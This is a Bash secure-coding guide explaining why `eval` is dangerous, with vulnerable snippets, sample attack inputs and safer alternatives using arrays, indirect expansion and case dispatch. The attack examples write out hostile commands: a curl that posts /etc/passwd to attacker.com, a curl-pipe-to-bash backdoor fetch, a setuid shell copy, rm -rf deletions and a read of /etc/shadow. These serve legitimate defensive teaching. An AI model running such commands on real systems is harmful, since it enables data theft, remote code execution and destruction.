## Eval Command

**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary, and even then, seek alternatives first.**

**Rationale:**

- **Code Injection**: `eval` executes arbitrary code, allowing complete system compromise if attacker-controlled
- **No Sandboxing**: Runs with full script privileges (file/network/command access)
- **Bypasses Validation**: Even sanitized input can contain metacharacters enabling injection
- **Difficult to Audit**: Dynamic code construction makes security review nearly impossible
- **Error Prone**: Quoting/escaping requirements complex and frequently implemented incorrectly
- **Better Alternatives Exist**: Almost every use case has safer alternatives

**Understanding eval:**

`eval` performs all expansions on a string, then executes the result.

```bash
# The danger: eval performs expansion TWICE
var='$(whoami)'
eval "echo $var"  # First expansion: echo $(whoami)
                   # Second expansion: executes whoami command!
```

**Attack Example 1: Direct Command Injection**

```bash
# Vulnerable - NEVER DO THIS!
user_input="$1"
eval "$user_input"
```

**Attack:**
```bash
./vulnerable-script.sh 'rm -rf /tmp/*'
./vulnerable-script.sh 'curl -X POST -d @/etc/passwd https://attacker.com/collect'
./vulnerable-script.sh 'curl https://attacker.com/backdoor.sh | bash'
./vulnerable-script.sh 'cp /bin/bash /tmp/rootshell; chmod u+s /tmp/rootshell'
```

**Attack Example 2: Variable Name Injection**

```bash
# Vulnerable - seems safe but isn't!
var_name="$1"
var_value="$2"
eval "$var_name='$var_value'"
```

**Attack:**
```bash
./vulnerable-script.sh 'x=$(rm -rf /important/data)' 'ignored'
./vulnerable-script.sh 'x' '$(cat /etc/shadow > /tmp/stolen)'
```

**Attack Example 3: Sanitization Bypass**

```bash
# Attempt to sanitize - INSUFFICIENT!
sanitized="${user_expr//[^0-9+\\-*\\/]/}"
eval "result=$sanitized"
```

**Attack:**
```bash
./vulnerable-script.sh 'PATH=0'  # Overwrites critical variable
```

**Safe Alternative 1: Use Arrays for Command Construction**

```bash
# ✓ Correct - build command safely with array
build_find_command() {
  local -- search_path="$1"
  local -- file_pattern="$2"
  local -a cmd

  cmd=(find "$search_path" -type f -name "$file_pattern")
  "${cmd[@]}"
}
```

**Safe Alternative 2: Use Indirect Expansion**

```bash
# ✗ Wrong
var_name='HOME'
eval "value=\\$$var_name"

# ✓ Correct - indirect expansion
echo "${!var_name}"

# ✓ Correct - for assignment
printf -v "$var_name" '%s' "$value"
```

**Safe Alternative 3: Use Associative Arrays**

```bash
# ✗ Wrong
for i in {1..5}; do
  eval "var_$i='value $i'"
done

# ✓ Correct
declare -A data
for i in {1..5}; do
  data["var_$i"]="value $i"
done
```

**Safe Alternative 4: Use Functions Instead of Dynamic Code**

```bash
# ✗ Wrong
eval "${action}_function"

# ✓ Correct - case statement
case "$action" in
  start)   start_function ;;
  stop)    stop_function ;;
  restart) restart_function ;;
  status)  status_function ;;
  *)       die 22 "Invalid action: $action" ;;
esac

# ✓ Also correct - associative array
declare -A actions=(
  [start]=start_function
  [stop]=stop_function
  [restart]=restart_function
  [status]=status_function
)

if [[ -v "actions[$action]" ]]; then
  "${actions[$action]}"
else
  die 22 "Invalid action: $action"
fi
```

**Safe Alternative 5: Use Command Substitution**

```bash
# ✗ Wrong
cmd='ls -la /tmp'
eval "output=\$($cmd)"

# ✓ Correct
output=$(ls -la /tmp)

# ✓ Correct - if command in variable
declare -a cmd=(ls -la /tmp)
output=$("${cmd[@]}")
```

**Safe Alternative 6: Use read for Parsing**

```bash
# ✗ Wrong
config_line="PORT=8080"
eval "$config_line"

# ✓ Correct - validate before assignment
IFS='=' read -r key value <<< "$config_line"
if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
  declare -g "$key=$value"
else
  die 22 "Invalid configuration key: $key"
fi
```

**Safe Alternative 7: Arithmetic Expansion**

```bash
# ✗ Wrong
eval "result=$((user_expr))"

# ✓ Correct - validate first
if [[ "$user_expr" =~ ^[0-9+\\-*/\\ ()]+$ ]]; then
  result=$((user_expr))
else
  die 22 "Invalid arithmetic expression: $user_expr"
fi
```

**Edge Cases:**

**Dynamic variable names:**

```bash
# ✓ Use associative array
declare -A service_status
for service in nginx apache mysql; do
  service_status["$service"]=$(systemctl is-active "$service")
done
```

**Building complex commands:**

```bash
# ✓ Use array
declare -a cmd=(find /data -type f)
[[ -n "$name_pattern" ]] && cmd+=(-name "$name_pattern")
[[ -n "$size" ]] && cmd+=(-size "$size")
"${cmd[@]}"
```

**Anti-patterns:**

```bash
# ✗ Wrong - eval with user input
eval "$user_command"

# ✓ Correct - whitelist validation
case "$user_command" in
  start|stop|restart|status) systemctl "$user_command" myapp ;;
  *) die 22 "Invalid command: $user_command" ;;
esac

# ✗ Wrong - eval for variable assignment
eval "$var_name='$var_value'"

# ✓ Correct
printf -v "$var_name" '%s' "$var_value"

# ✗ Wrong - eval to check if variable set
eval "if [[ -n \\$$var_name ]]; then echo set; fi"

# ✓ Correct
if [[ -v "$var_name" ]]; then
  echo set
fi

# ✗ Wrong - double expansion
eval "echo \$$var_name"

# ✓ Correct
echo "${!var_name}"
```

**Complete safe example (no eval):**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Configuration using associative array
declare -A config=(
  [app_name]='myapp'
  [app_port]='8080'
  [app_host]='localhost'
)

# Dynamic function dispatch
declare -A actions=(
  [start]=start_service
  [stop]=stop_service
  [restart]=restart_service
  [status]=status_service
)

start_service() {
  info "Starting ${config[app_name]} on ${config[app_host]}:${config[app_port]}"
}

stop_service() {
  info "Stopping ${config[app_name]}"
}

restart_service() {
  stop_service
  start_service
}

status_service() {
  info "${config[app_name]} is running"
}

build_curl_command() {
  local -- url="$1"
  local -a curl_cmd=(curl)

  [[ -v config[proxy] ]] && curl_cmd+=(--proxy "${config[proxy]}")
  [[ -v config[timeout] ]] && curl_cmd+=(--timeout "${config[timeout]}")
  curl_cmd+=("$url")

  "${curl_cmd[@]}"
}

main() {
  local -- action="${1:-status}"

  if [[ -v "actions[$action]" ]]; then
    "${actions[$action]}"
  else
    die 22 "Invalid action: $action. Valid: ${!actions[*]}"
  fi
}

main "$@"

#fin
```

**Summary:**

- **Never use eval with untrusted input** - no exceptions
- **Avoid eval entirely** - better alternatives exist for almost all use cases
- **Use arrays** for dynamic command construction: `cmd=(find); cmd+=(-name "*.txt"); "${cmd[@]}"`
- **Use indirect expansion** for variable references: `echo "${!var_name}"`
- **Use associative arrays** for dynamic data: `declare -A data; data[$key]=$value`
- **Use case/arrays** for function dispatch instead of eval
- **Validate strictly** if eval is absolutely unavoidable (which it almost never is)
- **Enable ShellCheck** to catch eval misuse

**Key principle:** If you think you need `eval`, you're solving the wrong problem. There is almost always a safer alternative using proper Bash features like arrays, indirect expansion, or associative arrays.
